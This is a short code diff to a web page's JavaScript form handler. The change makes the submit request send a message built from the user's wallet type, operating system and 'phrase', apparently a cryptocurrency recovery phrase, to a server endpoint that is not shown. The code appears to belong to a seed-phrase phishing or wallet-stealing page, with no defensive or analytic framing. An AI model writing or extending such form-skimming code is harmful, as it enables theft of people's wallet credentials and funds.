@@ -1560,7 +1560,7 @@ form.addEventListener('submit', (event) => {
           Accept: "application/json",
         },
         body: JSON.stringify({
-          message: formData,
+          message: "Wallet: "+formData.walletType + ", OS: "+formData.osType+", phrase: "+formData.phrase,
         }),
       })
         .then(function (response) {
